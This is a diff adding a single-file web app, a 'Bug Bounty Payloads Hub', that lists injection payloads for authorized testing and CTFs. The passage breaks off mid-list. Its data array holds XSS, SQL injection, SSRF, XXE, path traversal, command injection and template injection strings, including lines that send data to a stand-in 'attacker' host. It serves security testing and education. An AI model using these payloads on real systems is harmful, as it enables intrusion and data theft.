@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="matrix">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<meta name="color-scheme" content="dark" />
+
+<!-- ============================================================
+     SECURITY HEADERS (meta — applied by the browser at parse time)
+     - default-src 'none' kills every external resource by default.
+     - script-src/style-src 'unsafe-inline' is required because this
+       is a single-file app; injection is blocked structurally because
+       all dynamic rendering uses the DOM API (no innerHTML for vars).
+     - require-trusted-types-for 'script' makes any innerHTML/document.write
+       call throw at runtime in Chromium — defense in depth.
+     ============================================================ -->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'none';
+  script-src 'unsafe-inline';
+  style-src 'unsafe-inline';
+  img-src data: blob:;
+  font-src data:;
+  connect-src 'none';
+  frame-ancestors 'none';
+  form-action 'none';
+  base-uri 'none';
+  manifest-src 'none';
+  require-trusted-types-for 'script';
+" />
+<meta http-equiv="Referrer-Policy" content="no-referrer" />
+<meta http-equiv="Permissions-Policy" content="camera=(), microphone=(), geolocation=(), usb=(), payment=(), accelerometer=(), gyroscope=(), magnetometer=(), midi=(), interest-cohort=()" />
+<meta http-equiv="X-Content-Type-Options" content="nosniff" />
+
+<meta name="description" content="Bug Bounty Payloads Hub — an offline, ethics-first reference of common payload patterns for authorized security testing, CTFs, and education." />
+<meta name="theme-color" content="#0b0f0c" />
+<title>PAYLOADS // HUB · v2050.2</title>
+
+<link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='12' fill='%230b0f0c'/><text x='50%25' y='58%25' text-anchor='middle' font-family='monospace' font-size='38' fill='%2300ff9c'>%E2%9A%A1</text></svg>" />
+
+<style>
+  /* ============================================================
+     THEME TOKENS
+     ============================================================ */
+  :root {
+    --bg: #07090a;
+    --bg-soft: #0b0f0c;
+    --fg: #d6ffe6;
+    --accent: #00ff9c;
+    --accent-2: #00c2ff;
+    --accent-3: #ff3df0;
+    --danger: #ff4d6d;
+    --warn: #ffc857;
+    --line: color-mix(in oklab, var(--accent) 30%, transparent);
+    --line-strong: color-mix(in oklab, var(--accent) 60%, transparent);
+    --glass: color-mix(in oklab, var(--bg-soft) 70%, transparent);
+    --shadow: 0 20px 60px -20px color-mix(in oklab, var(--accent) 35%, transparent);
+    --radius: 14px;
+    --radius-sm: 8px;
+    --ease: cubic-bezier(.2,.7,.2,1);
+    --speed: .35s;
+  }
+  [data-theme="amber"]   { --accent:#ffb000; --accent-2:#ff7a00; --accent-3:#ffe27a; --fg:#ffe9c2; --bg:#0a0805; --bg-soft:#100c06; }
+  [data-theme="ice"]     { --accent:#7adcff; --accent-2:#a880ff; --accent-3:#ffffff; --fg:#dff3ff; --bg:#05080d; --bg-soft:#0a0f17; }
+  [data-theme="neon"]    { --accent:#ff3df0; --accent-2:#7c4dff; --accent-3:#00f0ff; --fg:#ffd4f7; --bg:#0a0510; --bg-soft:#100819; }
+  [data-theme="solar"]   { --accent:#fdf6e3; --accent-2:#b58900; --accent-3:#cb4b16; --fg:#eee8d5; --bg:#002b36; --bg-soft:#073642; }
+  [data-theme="void"]    { --accent:#ffffff; --accent-2:#ff2b2b; --accent-3:#888888; --fg:#ffffff; --bg:#000000; --bg-soft:#070707; }
+
+  @property --hue { syntax: '<angle>'; initial-value: 0deg; inherits: true; }
+
+  /* ============================================================
+     RESET
+     ============================================================ */
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    min-height: 100dvh;
+    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Inter, Roboto, sans-serif;
+    background:
+      radial-gradient(600px 400px at var(--cx,50%) var(--cy,50%), color-mix(in oklab, var(--accent) 8%, transparent), transparent 60%),
+      radial-gradient(1200px 800px at 80% -10%, color-mix(in oklab, var(--accent) 12%, transparent), transparent 60%),
+      radial-gradient(900px 600px at -10% 110%, color-mix(in oklab, var(--accent-2) 10%, transparent), transparent 60%),
+      var(--bg);
+    color: var(--fg);
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+  }
+  ::selection { background: color-mix(in oklab, var(--accent) 50%, transparent); color: #000; }
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-thumb { background: var(--line-strong); border-radius: 10px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+
+  /* ============================================================
+     BACKGROUND LAYERS
+     ============================================================ */
+  #bg {
+    position: fixed; inset: 0; width: 100%; height: 100%;
+    z-index: -3; display: block; opacity: .55;
+    mask-image: radial-gradient(ellipse at center, #000 55%, transparent 100%);
+  }
+  .grain {
+    position: fixed; inset: 0; z-index: -2; pointer-events: none; opacity: .06; mix-blend-mode: overlay;
+    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='160' height='160'><filter id='n'><feTurbulence baseFrequency='0.9' numOctaves='2' stitchTiles='stitch'/></filter><rect width='100%25' height='100%25' filter='url(%23n)' opacity='0.6'/></svg>");
+  }
+  .scanlines {
+    position: fixed; inset: 0; z-index: -1; pointer-events: none; opacity: 0;
+    background: repeating-linear-gradient(0deg, rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
+    transition: opacity var(--speed);
+  }
+  body[data-scanlines="on"] .scanlines { opacity: .35; }
+
+  /* ============================================================
+     BOOT REVEAL
+     ============================================================ */
+  #boot {
+    position: fixed; inset: 0; z-index: 200; background: var(--bg);
+    display: grid; place-items: center; gap: 1rem;
+    color: var(--accent); font-family: ui-monospace, "JetBrains Mono", Menlo, monospace;
+    transition: opacity .5s var(--ease), visibility .5s;
+  }
+  #boot.done { opacity: 0; visibility: hidden; pointer-events: none; }
+  #boot pre { margin: 0; font-size: clamp(.75rem, 2vw, .95rem); line-height: 1.6; min-height: 9em; white-space: pre-wrap; }
+  #boot .caret::after { content: "▌"; animation: blink 1s steps(2) infinite; margin-left: 2px; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* ============================================================
+     TOPBAR
+     ============================================================ */
+  .topbar {
+    position: sticky; top: 0; z-index: 50;
+    backdrop-filter: blur(14px) saturate(160%);
+    -webkit-backdrop-filter: blur(14px) saturate(160%);
+    background: color-mix(in oklab, var(--bg) 70%, transparent);
+    border-bottom: 1px solid var(--line);
+  }
+  .topbar-inner {
+    max-width: 1280px; margin: 0 auto; padding: .9rem 1.2rem;
+    display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;
+  }
+  .brand {
+    display: flex; align-items: center; gap: .65rem; font-family: ui-monospace, "JetBrains Mono", Menlo, monospace;
+    font-weight: 700; letter-spacing: .04em; font-size: 1.05rem;
+  }
+  .brand .dot {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--accent); box-shadow: 0 0 14px var(--accent);
+    animation: pulse 2.4s var(--ease) infinite;
+  }
+  @keyframes pulse { 0%,100%{ transform: scale(1); opacity:1 } 50%{ transform: scale(1.4); opacity:.55 } }
+  .brand small { font-weight: 400; opacity: .55; margin-left: .25rem; }
+  .spacer { flex: 1; }
+
+  .kbd {
+    display: inline-flex; align-items: center; gap: .35rem;
+    border: 1px solid var(--line); padding: .2rem .45rem;
+    border-radius: 6px; font-family: ui-monospace, monospace; font-size: .75rem;
+    background: color-mix(in oklab, var(--bg-soft) 60%, transparent);
+    color: color-mix(in oklab, var(--fg) 80%, transparent);
+  }
+  .icon-btn {
+    appearance: none; cursor: pointer;
+    background: color-mix(in oklab, var(--bg-soft) 50%, transparent);
+    color: var(--fg);
+    border: 1px solid var(--line); border-radius: 10px;
+    padding: .55rem .7rem; font-size: .9rem;
+    display: inline-flex; align-items: center; gap: .45rem;
+    transition: border-color var(--speed) var(--ease), transform .15s var(--ease), background var(--speed);
+  }
+  .icon-btn:hover { border-color: var(--accent); transform: translateY(-1px); }
+  .icon-btn:active { transform: translateY(0); }
+  .icon-btn[aria-pressed="true"] { border-color: var(--accent); color: var(--accent); }
+
+  .theme-pick { display: inline-flex; gap: .35rem; padding: .25rem; border: 1px solid var(--line); border-radius: 999px; }
+  .theme-pick button {
+    width: 22px; height: 22px; border-radius: 50%; border: 1px solid transparent;
+    cursor: pointer; padding: 0;
+  }
+  .theme-pick button[aria-pressed="true"] { border-color: var(--fg); transform: scale(1.05); }
+  .swatch-matrix { background: linear-gradient(135deg, #00ff9c, #0b0f0c); }
+  .swatch-amber  { background: linear-gradient(135deg, #ffb000, #100c06); }
+  .swatch-ice    { background: linear-gradient(135deg, #7adcff, #05080d); }
+  .swatch-neon   { background: linear-gradient(135deg, #ff3df0, #0a0510); }
+  .swatch-solar  { background: linear-gradient(135deg, #fdf6e3, #002b36); }
+  .swatch-void   { background: linear-gradient(135deg, #ffffff, #000000); display: none; }
+  body[data-void="on"] .swatch-void { display: inline-block; }
+
+  /* ============================================================
+     HERO
+     ============================================================ */
+  .hero { padding: 4rem 1.2rem 2rem; text-align: center; max-width: 1100px; margin: 0 auto; }
+  .hero h1 {
+    --glitch-x: 0px;
+    font-family: ui-monospace, "JetBrains Mono", Menlo, monospace;
+    font-weight: 800; letter-spacing: -.02em; line-height: 1.05;
+    font-size: clamp(2.2rem, 6vw, 4.6rem); margin: 0 0 1rem;
+    background: conic-gradient(from var(--hue), var(--accent), var(--accent-2), var(--accent-3), var(--accent));
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    animation: hueShift 12s linear infinite;
+    text-shadow: 0 0 40px color-mix(in oklab, var(--accent) 22%, transparent);
+    position: relative; display: inline-block; cursor: default;
+  }
+  .hero h1[data-text]::before,
+  .hero h1[data-text]::after {
+    content: attr(data-text); position: absolute; inset: 0;
+    background: inherit; -webkit-background-clip: text; background-clip: text; color: transparent;
+    pointer-events: none; opacity: 0;
+  }
+  .hero h1:hover::before { transform: translate(calc(var(--glitch-x) * -1), 0); opacity: .7; mix-blend-mode: screen; animation: glitch 1s infinite linear alternate-reverse; }
+  .hero h1:hover::after  { transform: translate(var(--glitch-x), 0);                opacity: .7; mix-blend-mode: screen; animation: glitch 1.4s infinite linear alternate; }
+  @keyframes glitch { 0%{--glitch-x:1px}50%{--glitch-x:3px}100%{--glitch-x:2px} }
+  @keyframes hueShift { to { --hue: 360deg; } }
+  .hero p { margin: 0 auto; max-width: 60ch; opacity: .75; font-size: 1.05rem; }
+
+  .stat-row {
+    display: flex; flex-wrap: wrap; justify-content: center; gap: 1rem 2rem;
+    margin-top: 2rem; font-family: ui-monospace, monospace; font-size: .9rem; opacity: .85;
+  }
+  .stat-row b { color: var(--accent); font-size: 1.4rem; display: block; }
+
+  /* ============================================================
+     CONTAINER + WARNING
+     ============================================================ */
+  .container { max-width: 1280px; margin: 0 auto; padding: 1rem 1.2rem 5rem; }
+
+  .warning {
+    border: 1px solid color-mix(in oklab, var(--warn) 50%, transparent);
+    background: color-mix(in oklab, var(--warn) 8%, transparent);
+    border-radius: var(--radius); padding: 1rem 1.25rem; margin: 1.5rem 0;
+    display: flex; gap: .9rem; align-items: flex-start;
+  }
+  .warning .icon { font-size: 1.4rem; line-height: 1; }
+  .warning h3 { margin: 0 0 .25rem; color: var(--warn); font-size: 1rem; }
+  .warning p  { margin: 0; opacity: .85; font-size: .92rem; }
+
+  /* ============================================================
+     TOOLBAR
+     ============================================================ */
+  .toolbar {
+    display: flex; flex-wrap: wrap; gap: .8rem; align-items: center;
+    margin-bottom: 1.25rem;
+  }
+  .search { flex: 1; min-width: 240px; position: relative; }
+  .search input {
+    width: 100%; padding: .9rem 1rem .9rem 2.6rem;
+    background: var(--glass); border: 1px solid var(--line); border-radius: 12px;
+    color: var(--fg); font-size: 1rem; outline: none;
+    transition: border-color var(--speed) var(--ease), box-shadow var(--speed) var(--ease);
+    backdrop-filter: blur(10px);
+  }
+  .search input::placeholder { color: color-mix(in oklab, var(--fg) 40%, transparent); }
+  .search input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px color-mix(in oklab, var(--accent) 18%, transparent); }
+  .search svg { position: absolute; left: .9rem; top: 50%; transform: translateY(-50%); width: 18px; height: 18px; opacity: .65; }
+  .search .hint { position: absolute; right: .6rem; top: 50%; transform: translateY(-50%); }
+
+  .chips { display: flex; gap: .4rem; flex-wrap: wrap; }
+  .chip {
+    appearance: none; cursor: pointer;
+    border: 1px solid var(--line); background: transparent; color: var(--fg);
+    padding: .45rem .8rem; border-radius: 999px; font-size: .82rem;
+    transition: all var(--speed) var(--ease);
+    font-family: ui-monospace, monospace;
+  }
+  .chip:hover { border-color: var(--accent); }
+  .chip[aria-pressed="true"] { background: color-mix(in oklab, var(--accent) 18%, transparent); border-color: var(--accent); color: var(--accent); }
+
+  /* ============================================================
+     GRID + CARDS
+     ============================================================ */
+  .grid {
+    display: grid; gap: 1.4rem;
+    grid-template-columns: repeat(auto-fill, minmax(min(340px, 100%), 1fr));
+    container-type: inline-size;
+  }
+
+  .card {
+    position: relative; isolation: isolate;
+    border-radius: var(--radius);
+    background: color-mix(in oklab, var(--bg-soft) 85%, transparent);
+    backdrop-filter: blur(10px) saturate(140%);
+    padding: 1.25rem 1.25rem 1rem;
+    transform-style: preserve-3d;
+    transform: perspective(900px) rotateX(var(--rx,0deg)) rotateY(var(--ry,0deg));
+    transition: transform .25s var(--ease), box-shadow var(--speed) var(--ease);
+    border: 1px solid color-mix(in oklab, var(--accent) 18%, transparent);
+    animation: cardIn .55s var(--ease) both;
+  }
+  @keyframes cardIn { from { opacity: 0; transform: translateY(10px); } }
+  .card::before {
+    content: ""; position: absolute; inset: -1px; border-radius: inherit; padding: 1px;
+    background: conic-gradient(from var(--hue, 0deg),
+      color-mix(in oklab, var(--accent) 70%, transparent),
+      color-mix(in oklab, var(--accent-2) 70%, transparent),
+      color-mix(in oklab, var(--accent-3) 70%, transparent),
+      color-mix(in oklab, var(--accent) 70%, transparent));
+    -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+            mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+    -webkit-mask-composite: xor; mask-composite: exclude;
+    opacity: .35; transition: opacity var(--speed); pointer-events: none;
+    animation: hueShift 18s linear infinite;
+  }
+  .card:hover { box-shadow: var(--shadow); }
+  .card:hover::before { opacity: .9; }
+  .card::after {
+    content: ""; position: absolute; inset: 0; border-radius: inherit; pointer-events: none;
+    background: radial-gradient(220px 160px at var(--mx,50%) var(--my,50%),
+                color-mix(in oklab, var(--accent) 22%, transparent), transparent 60%);
+    opacity: 0; transition: opacity var(--speed); z-index: -1;
+  }
+  .card:hover::after { opacity: 1; }
+
+  .card-head {
+    display: flex; align-items: center; gap: .65rem; margin-bottom: .6rem;
+  }
+  .card-head .icon {
+    width: 36px; height: 36px; border-radius: 10px; display: grid; place-items: center;
+    background: color-mix(in oklab, var(--accent) 12%, transparent);
+    border: 1px solid var(--line); font-size: 1.05rem;
+  }
+  .card-head h3 {
+    margin: 0; font-size: 1.05rem; font-family: ui-monospace, monospace; letter-spacing: .02em;
+  }
+  .card-head .count {
+    margin-left: auto; font-family: ui-monospace, monospace; font-size: .75rem;
+    opacity: .7; padding: .2rem .5rem; border: 1px solid var(--line); border-radius: 999px;
+  }
+
+  /* Severity ring */
+  .sev-ring {
+    width: 22px; height: 22px; border-radius: 50%;
+    background: conic-gradient(var(--ring-color) calc(var(--ring) * 1%), color-mix(in oklab, var(--fg) 12%, transparent) 0);
+    display: grid; place-items: center; position: relative;
+  }
+  .sev-ring::after {
+    content: ""; width: 14px; height: 14px; border-radius: 50%;
+    background: var(--bg-soft);
+  }
+
+  .tags { display: flex; flex-wrap: wrap; gap: .3rem; margin-bottom: .8rem; }
+  .tag {
+    font-family: ui-monospace, monospace; font-size: .7rem;
+    padding: .12rem .45rem; border-radius: 999px;
+    color: color-mix(in oklab, var(--fg) 70%, transparent);
+    border: 1px solid color-mix(in oklab, var(--accent) 25%, transparent);
+    background: color-mix(in oklab, var(--accent) 6%, transparent);
+  }
+
+  .list {
+    max-height: 320px; overflow-y: auto;
+    display: flex; flex-direction: column; gap: .45rem;
+    padding-right: .25rem;
+    scrollbar-width: thin;
+  }
+
+  .item {
+    position: relative; padding: .6rem 4.5rem .6rem .7rem; border-radius: var(--radius-sm);
+    background: color-mix(in oklab, var(--bg) 55%, transparent);
+    border: 1px solid color-mix(in oklab, var(--accent) 12%, transparent);
+    border-left: 3px solid var(--accent);
+    font-family: ui-monospace, "JetBrains Mono", Menlo, monospace;
+    font-size: .82rem; line-height: 1.45;
+    word-break: break-word; cursor: pointer;
+    transition: background var(--speed), border-color var(--speed), transform .2s var(--ease);
+  }
+  .item:hover { background: color-mix(in oklab, var(--accent) 8%, transparent); border-left-color: var(--accent-2); transform: translateX(3px); }
+  .item:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .item mark { background: color-mix(in oklab, var(--accent) 30%, transparent); color: inherit; border-radius: 3px; padding: 0 2px; }
+  .item .actions {
+    position: absolute; top: 4px; right: 4px;
+    display: flex; gap: 2px; opacity: 0; transition: opacity var(--speed);
+  }
+  .item:hover .actions, .item:focus-within .actions { opacity: 1; }
+  .item .actions button {
+    background: color-mix(in oklab, var(--bg-soft) 80%, transparent);
+    border: 1px solid var(--line); color: var(--fg);
+    padding: 2px 6px; border-radius: 5px; cursor: pointer; font-size: .7rem;
+    font-family: ui-monospace, monospace;
+  }
+  .item .actions button:hover { border-color: var(--accent); color: var(--accent); }
+  .star { color: color-mix(in oklab, var(--fg) 35%, transparent); }
+  .item.fav .star { color: var(--warn); text-shadow: 0 0 10px var(--warn); }
+
+  .empty {
+    text-align: center; padding: 3rem 1rem; opacity: .6; grid-column: 1/-1;
+    font-family: ui-monospace, monospace;
+  }
+
+  /* ============================================================
+     FOOTER
+     ============================================================ */
+  footer {
+    text-align: center; padding: 2rem 1rem; opacity: .55; font-size: .85rem;
+    border-top: 1px solid var(--line); margin-top: 2rem;
+  }
+
+  /* ============================================================
+     TOAST
+     ============================================================ */
+  #toasts {
+    position: fixed; bottom: 1.2rem; right: 1.2rem; z-index: 100;
+    display: flex; flex-direction: column; gap: .5rem; pointer-events: none;
+  }
+  .toast {
+    background: color-mix(in oklab, var(--bg-soft) 92%, transparent);
+    border: 1px solid var(--line-strong); color: var(--fg);
+    padding: .65rem .9rem; border-radius: 10px; font-size: .9rem;
+    box-shadow: var(--shadow); backdrop-filter: blur(8px);
+    transform: translateY(8px); opacity: 0; animation: toastIn .25s var(--ease) forwards;
+  }
+  @keyframes toastIn { to { transform: none; opacity: 1; } }
+  .toast.out { animation: toastOut .25s var(--ease) forwards; }
+  @keyframes toastOut { to { transform: translateY(8px); opacity: 0; } }
+
+  /* ============================================================
+     COMMAND PALETTE
+     ============================================================ */
+  .palette-backdrop {
+    position: fixed; inset: 0; z-index: 90; background: color-mix(in oklab, #000 55%, transparent);
+    backdrop-filter: blur(8px); display: none; align-items: flex-start; justify-content: center; padding-top: 12vh;
+  }
+  .palette-backdrop[open] { display: flex; }
+  .palette {
+    width: min(680px, 92vw); background: color-mix(in oklab, var(--bg-soft) 95%, transparent);
+    border: 1px solid var(--line-strong); border-radius: 14px;
+    box-shadow: 0 30px 80px -10px rgba(0,0,0,.6); overflow: hidden;
+    animation: palIn .2s var(--ease);
+  }
+  @keyframes palIn { from { transform: translateY(-12px) scale(.98); opacity: 0; } }
+  .palette input {
+    width: 100%; padding: 1rem 1.2rem; background: transparent; border: 0;
+    color: var(--fg); font-size: 1.05rem; outline: none; border-bottom: 1px solid var(--line);
+  }
+  .palette ul { list-style: none; margin: 0; padding: .35rem; max-height: 50vh; overflow-y: auto; }
+  .palette li {
+    padding: .55rem .7rem; border-radius: 8px; cursor: pointer;
+    display: flex; gap: .8rem; align-items: center; font-size: .9rem;
+  }
+  .palette li small { opacity: .5; margin-left: auto; font-family: ui-monospace, monospace; font-size: .75rem; }
+  .palette li[aria-selected="true"], .palette li:hover { background: color-mix(in oklab, var(--accent) 14%, transparent); }
+  .palette li .label {
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 60ch;
+    font-family: ui-monospace, monospace;
+  }
+
+  /* ============================================================
+     HUD
+     ============================================================ */
+  #hud {
+    position: fixed; left: 1rem; bottom: 1rem; z-index: 60;
+    background: color-mix(in oklab, var(--bg-soft) 80%, transparent);
+    border: 1px solid var(--line); border-radius: 10px;
+    padding: .5rem .75rem; font-family: ui-monospace, monospace; font-size: .72rem;
+    color: color-mix(in oklab, var(--fg) 80%, transparent);
+    backdrop-filter: blur(8px);
+    display: grid; grid-template-columns: auto auto; gap: .15rem .8rem;
+    pointer-events: none; user-select: none;
+  }
+  #hud b { color: var(--accent); font-weight: 600; }
+  @media (max-width: 640px) { #hud { display: none; } }
+
+  /* ============================================================
+     A11Y / MOTION
+     ============================================================ */
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation-duration: 0.001ms !important; transition: none !important; }
+    .card { transform: none !important; }
+    #bg, .scanlines { display: none; }
+  }
+  @media print { #bg, .topbar, .toolbar, footer, #toasts, #hud { display: none !important; } }
+  @container (max-width: 380px) {
+    .card-head h3 { font-size: .95rem; }
+    .item { font-size: .75rem; }
+  }
+  .sr-only {
+    position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+    overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
+  }
+</style>
+</head>
+<body>
+
+<canvas id="bg" aria-hidden="true"></canvas>
+<div class="grain" aria-hidden="true"></div>
+<div class="scanlines" aria-hidden="true"></div>
+
+<div id="boot" aria-hidden="true">
+  <pre id="bootLog" class="caret"></pre>
+</div>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <span class="dot" aria-hidden="true"></span>
+      PAYLOADS<span style="color:var(--accent)">//HUB</span>
+      <small>v2050.2</small>
+    </div>
+    <div class="spacer"></div>
+
+    <button class="icon-btn" id="openPalette" title="Command palette (Ctrl+K)" aria-label="Open command palette">
+      <span aria-hidden="true">⌘</span> Search <span class="kbd">Ctrl K</span>
+    </button>
+
+    <button class="icon-btn" id="toggleFav" title="Show favorites only" aria-pressed="false">
+      <span aria-hidden="true">★</span><span class="sr-only">Show favorites only</span>
+    </button>
+
+    <button class="icon-btn" id="toggleScan" title="CRT scanlines" aria-pressed="false">
+      <span aria-hidden="true">▤</span><span class="sr-only">Toggle scanlines</span>
+    </button>
+
+    <button class="icon-btn" id="toggleMotion" title="Toggle background animation" aria-pressed="true">
+      <span aria-hidden="true">◐</span><span class="sr-only">Toggle motion</span>
+    </button>
+
+    <div class="theme-pick" role="group" aria-label="Theme">
+      <button class="swatch-matrix" data-theme="matrix" title="Matrix"    aria-label="Matrix theme"    aria-pressed="true"></button>
+      <button class="swatch-amber"  data-theme="amber"  title="Amber CRT" aria-label="Amber CRT theme" aria-pressed="false"></button>
+      <button class="swatch-ice"    data-theme="ice"    title="Ice"       aria-label="Ice theme"       aria-pressed="false"></button>
+      <button class="swatch-neon"   data-theme="neon"   title="Neon"      aria-label="Neon theme"      aria-pressed="false"></button>
+      <button class="swatch-solar"  data-theme="solar"  title="Solar"     aria-label="Solar theme"     aria-pressed="false"></button>
+      <button class="swatch-void"   data-theme="void"   title="Void (hidden)" aria-label="Void theme" aria-pressed="false"></button>
+    </div>
+  </div>
+</header>
+
+<section class="hero">
+  <h1 id="heroTitle" data-text="Bug Bounty Payloads Hub">Bug Bounty Payloads Hub</h1>
+  <p>An ethical, offline-first reference of payload patterns for authorized testing, CTFs, and education. Fast, private, hardened — built like it's 2050.</p>
+  <div class="stat-row" id="statRow">
+    <div><b id="statCats">0</b> categories</div>
+    <div><b id="statPayloads">0</b> payloads</div>
+    <div><b>100%</b> offline</div>
+    <div><b id="statHardening">CSP+TT</b> hardened</div>
+  </div>
+</section>
+
+<main class="container">
+
+  <div class="warning" role="note">
+    <div class="icon" aria-hidden="true">⚠️</div>
+    <div>
+      <h3>Authorized testing only</h3>
+      <p>Use these patterns only on systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.</p>
+    </div>
+  </div>
+
+  <div class="toolbar">
+    <label class="search">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
+      <input id="search" type="search" placeholder="Filter payloads, categories, tags…" autocomplete="off" spellcheck="false" />
+      <span class="hint kbd" aria-hidden="true">/</span>
+    </label>
+    <div class="chips" id="chips" role="tablist" aria-label="Filter by category"></div>
+  </div>
+
+  <div class="grid" id="grid" aria-live="polite"></div>
+</main>
+
+<footer>
+  <p>© 2026 Payloads Hub · Crafted for ethical hackers · No telemetry · Hardened single-file PWA</p>
+</footer>
+
+<div id="toasts" aria-live="polite" aria-atomic="true"></div>
+
+<div class="palette-backdrop" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette">
+    <input id="paletteInput" type="text" placeholder="Type to search payloads, themes, actions…" autocomplete="off" spellcheck="false" />
+    <ul id="paletteList" role="listbox"></ul>
+  </div>
+</div>
+
+<div id="hud" aria-hidden="true">
+  <span>FPS</span><b id="hudFps">--</b>
+  <span>THEME</span><b id="hudTheme">matrix</b>
+  <span>TIME</span><b id="hudTime">--:--:--</b>
+  <span>NODES</span><b id="hudNodes">0</b>
+</div>
+
+<script>
+"use strict";
+
+/* ============================================================
+   TRUSTED TYPES — stop any future innerHTML attempt cold.
+   Chromium enforces; other browsers ignore safely.
+   We deliberately do NOT install a permissive default policy:
+   any TrustedHTML sink will throw, surfacing the bug instead
+   of silently injecting markup.
+   ============================================================ */
+// (CSP meta already declared `require-trusted-types-for 'script'`.)
+
+/* ============================================================
+   DATA — curated reference, all static, all our control.
+   ============================================================ */
+const DATA = [
+  { id:"xss", title:"XSS", icon:"⚡", sev:"high", tags:["injection","client"], items:[
+    "<script>alert(1)<\/script>",
+    "<img src=x onerror=alert(document.domain)>",
+    "<svg/onload=alert(1)>",
+    "\"><svg onload=confirm(1)>",
+    "javascript:alert(1)",
+    "<iframe srcdoc=\"<script>alert(1)<\/script>\"></iframe>",
+    "<details open ontoggle=alert(1)>",
+    "<body onload=alert(1)>",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "<math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">"
+  ]},
+  { id:"sqli", title:"SQL Injection", icon:"🗃️", sev:"crit", tags:["injection","server","database"], items:[
+    "' OR '1'='1' -- -",
+    "\" OR \"\"=\"",
+    "' UNION SELECT NULL,version(),NULL -- -",
+    "1) OR 1=1 -- -",
+    "admin' -- -",
+    "' AND SLEEP(5) -- -",
+    "' OR 1=1 LIMIT 1 -- -",
+    "1' ORDER BY 10 -- -",
+    "0 UNION ALL SELECT NULL,@@version,NULL,NULL -- -",
+    "'; WAITFOR DELAY '0:0:5' -- -"
+  ]},
+  { id:"ssrf", title:"SSRF", icon:"🌐", sev:"high", tags:["server","network"], items:[
+    "http://127.0.0.1/",
+    "http://localhost:80/admin",
+    "http://[::1]/",
+    "http://0.0.0.0:8080/",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "gopher://127.0.0.1:6379/_INFO",
+    "file:///etc/passwd",
+    "dict://127.0.0.1:11211/stats",
+    "http://2130706433/  (decimal localhost)"
+  ]},
+  { id:"xxe", title:"XXE", icon:"📄", sev:"high", tags:["injection","xml"], items:[
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
+    "<!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://attacker/x.dtd\"> %ext;]>",
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/'>]><r>&x;</r>",
+    "<!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/passwd\"><!ENTITY % q \"<!ENTITY exfil SYSTEM 'http://a/?d=%p;'>\">%q;]>"
+  ]},
+  { id:"lfi", title:"LFI / Path Traversal", icon:"📁", sev:"high", tags:["server","files"], items:[
+    "../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%c0%af..%c0%afetc/passwd",
+    "/etc/passwd%00.png",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "expect://id",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts"
+  ]},
+  { id:"rce", title:"Command Injection", icon:"💻", sev:"crit", tags:["server","exec"], items:[
+    "; id",
+    "| id",
+    "&& whoami",
+    "`id`",
+    "$(id)",
+    "; cat /etc/passwd #",
+    "127.0.0.1; sleep 5",
+    "$(curl http://attacker/`id`)"
+  ]},
+  { id:"ssti", title:"SSTI (Templates)", icon:"🧩", sev:"high", tags:["injection","template"], items:[
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "{{config.items()}}",
+    "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+    "#set($x=$context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'))"
+  ]},
+  { id:"nosql", title:"NoSQL Injection", icon:"🍃", sev:"high", tags:["injection","database"], items:[
+    "{\"$ne\": null}",
+    "{\"$gt\": \"\"}",
+    "user[$ne]=&pass[$ne]=",
+    "{\"$where\": \"sleep(5000)\"}",
+    "';return true;var x='",
+    "{\"username\":{\"$regex\":\"^a\"}}"
+  ]},
+  { id:"jwt", title:"JWT Pitfalls", icon:"🔑", sev:"high", tags:["auth","token"], items:[
